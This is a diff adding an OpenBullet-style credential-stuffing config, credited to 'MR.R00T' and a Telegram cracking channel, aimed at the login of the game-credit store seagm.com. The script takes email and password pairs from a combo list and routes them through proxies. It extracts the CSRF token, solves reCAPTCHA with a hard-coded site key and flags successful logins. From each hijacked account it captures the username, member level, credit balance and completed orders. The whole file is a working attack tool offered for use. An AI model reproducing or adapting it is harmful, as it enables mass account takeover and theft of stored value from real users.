@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "SEAGM.COM V2 BY [MR.R00T]",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-21T10:27:42.469634-07:00",
+  "AdditionalInfo": "SET CAP \"Config BY\" \"TG/@Rootcrackinghub\"",
+  "Author": "🔥MR.R00T🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "NEED SOLVER- JOIN TG/@Rootcrackinghub",
+      "VariableName": "S",
+      "Id": 139994730
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://member.seagm.com/sso/login?origin=https%3A%2F%2Fwww.seagm.com%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access denied | member.seagm.com used Cloudflare to restrict" 
+    KEY "light\">Access denied</h2>" 
+
+PARSE "<SOURCE>" LR "id=\"csrfToken\" value=\"" "\">" -> VAR "TK" 
+
+RECAPTCHA "https://member.seagm.com/sso/login/do?origin=https%3A%2F%2Fwww.seagm.com%2F" "6Lc4sicTAAAAAKAwhrHSdezGMC_ZWSc8JS31MwHz" -> VAR "TR" 
+
+REQUEST POST "https://member.seagm.com/sso/login/do?origin=https%3A%2F%2Fwww.seagm.com%2F" Multipart 
+  
+  STRINGCONTENT "csrfToken: <TK>" 
+  STRINGCONTENT "email: <USER>" 
+  STRINGCONTENT "password: <PASS>" 
+  STRINGCONTENT "g-recaptcha-response: <TR>" 
+  BOUNDARY "WebKitFormBoundary9kd6AqXklTb4hTsi" 
+  HEADER "origin: https://member.seagm.com" 
+  HEADER "referer: https://member.seagm.com/sso/login?origin=https%3A%2F%2Fwww.seagm.com%2F" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Account was suspended." 
+    KEY "Login error" 
+  KEYCHAIN Success OR 
+    KEY "Login success" 
+    KEY "Login success. Redirecting..." 
+
+REQUEST GET " https://www.seagm.com/member" 
+  
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "referer: https://member.seagm.com/" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<div class=\"name\"><span>" "</span>" CreateEmpty=FALSE -> CAP "Username" 
+
+PARSE "<SOURCE>" REGEX "<span data-member-level=\"(.*)\">(.*)<\\/span>" "[1] [2]" CreateEmpty=FALSE -> CAP "Level" 
+
+PARSE "<SOURCE>" LR "<b class=\"credits\">" "</b>" CreateEmpty=FALSE -> CAP "Credits" 
+
+PARSE "<SOURCE>" REGEX "\"completed\">\\n<span data-counter=\"(.*)\">Completed" "[1]" CreateEmpty=FALSE -> CAP "Completed Orders" 
+
+PARSE "<SOURCE>" REGEX "<div class=\"T\">\\n<div class=\"name\">(.*)<\\/div>" "[1]" Recursive=TRUE CreateEmpty=FALSE -> CAP "List" 
+
+SET CAP "Cofnig BY" "🔥@Rootcrackinghub🔥"
+
